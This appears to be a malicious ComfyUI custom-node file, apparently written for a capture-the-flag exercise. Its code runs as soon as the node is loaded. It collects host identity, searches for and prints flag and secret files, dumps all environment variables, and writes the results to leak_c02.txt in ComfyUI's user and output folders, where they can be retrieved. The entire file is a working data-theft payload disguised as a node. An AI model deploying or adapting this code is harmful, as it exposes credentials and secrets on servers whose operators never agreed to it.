import subprocess, os, base64, traceback

OUT = []
def w(s):
    OUT.append(str(s))

w("== IDENTITY ==")
for c in ["id","hostname","uname -a","whoami","pwd"]:
    try: w("$ "+c+"\n"+subprocess.run(["sh","-c",c],capture_output=True,text=True,timeout=20).stdout)
    except Exception as e: w("ERR "+c+" "+str(e))

w("== ROOT LISTING ==")
try: w(subprocess.run(["sh","-c","ls -la /"],capture_output=True,text=True,timeout=20).stdout)
except Exception as e: w(str(e))

w("== FLAG FILES ==")
cmd = ("find / -xdev -maxdepth 5 \\( -iname '*flag*' -o -iname '*tsec*' -o -iname '*secret*' \\) 2>/dev/null; "
       "echo '---- cat candidates ----'; "
       "cat /flag /flag.txt /flag* /root/flag* /home/*/flag* /tmp/flag* /opt/flag* /app/flag* /srv/flag* /data/flag* 2>/dev/null; "
       "echo '---- end ----'")
try: w(subprocess.run(["sh","-c",cmd],capture_output=True,text=True,timeout=40).stdout)
except Exception as e: w(str(e))

w("== ENV ==")
try: w(subprocess.run(["sh","-c","env | sort"],capture_output=True,text=True,timeout=20).stdout)
except Exception as e: w(str(e))

w("== COMFY DIRS ==")
try: w(subprocess.run(["sh","-c","ls -la /ComfyUI /ComfyUI/user /ComfyUI/user/default /ComfyUI/output 2>/dev/null"],capture_output=True,text=True,timeout=20).stdout)
except Exception as e: w(str(e))

data = "\n".join(OUT)
for p in ["/ComfyUI/user/default/leak_c02.txt","/ComfyUI/output/leak_c02.txt","/tmp/leak_c02.txt"]:
    try:
        d=os.path.dirname(p)
        if d and not os.path.exists(d): os.makedirs(d,exist_ok=True)
        open(p,"w").write(data)
    except Exception:
        pass

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
